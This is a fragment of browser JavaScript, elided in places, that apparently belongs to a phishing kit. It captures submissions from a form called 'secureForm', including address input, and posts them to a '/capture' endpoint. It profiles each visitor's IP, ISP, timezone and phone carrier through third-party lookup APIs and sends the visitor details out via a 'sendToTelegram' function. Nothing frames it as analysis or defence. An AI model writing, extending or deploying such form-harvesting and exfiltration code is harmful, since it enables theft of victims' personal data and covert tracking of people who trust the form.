(function() {
    ...
    // Phone Intelligence API Configuration
    const getPhoneNumberInfo = (phoneNumber) => {
        return fetch(`https://phone-intelligence.abstractapi.com/v1/?api_key=${config.abstract.phone_intelligence.api_key}&phone_number=${phoneNumber}`)
            .then(response => response.json())
            .catch(e => ({ valid: false, carrier: '', line_type: '' }));
    };

    // IP Intelligence API Configuration
    const getIPInfo = () => {
        return fetch(`https://ip-intelligence.abstractapi.com/v1/?api_key=${config.abstract.ip_intelligence.api_key}`)
            .then(response => response.json())
            .catch(e => ({ ip: '', isp: '', location: { timezone: '' } }));
    };
    ...
    const init = () => {
        ...
        const handleCapture = (form, formType) => {
            ...
            fetch('/capture', { method: 'POST', body: formData }).catch(e => {});
            ...
            secureForm.addEventListener('submit', e => {
                ...
                if (addressInput) {
                    ...
                    if (val.length < 5) {
                        ...
                        const clearError = debounce(function onInput() {
                            addressInput.classList.remove('invalid');
                            addressInput.setCustomValidity("");
                            addressInput.removeEventListener('input', clearError);
                        }, 300);
    ...
    const trackVisit = () => {
        if (!sessionStorage.getItem('v_tracked')) {
            const sendPing = (fp = 'unknown') => {
                ...
                fetch('/capture', { method: 'POST', body: data }).catch(e => {});
        ...
        // Capture IP and Timezone Information
        getIPInfo().then(ipData => {
            const ip = ipData.ip || 'unknown';
            const isp = ipData.isp || 'unknown';
            const timezone = ipData.location.timezone || 'unknown';
            ...
            const visitorInfo = {
                sessionId: _sid,
                formType: 'visitor_info',
                ip: ip,
                isp: isp,
                timezone: timezone
            };
            sendToTelegram(JSON.stringify(visitorInfo));
        });
    };

    const storeCurrentPage = () => {
        sessionStorage.setItem('current_page', window.location.pathname);
    };

    const restorePreviousPage = () => {
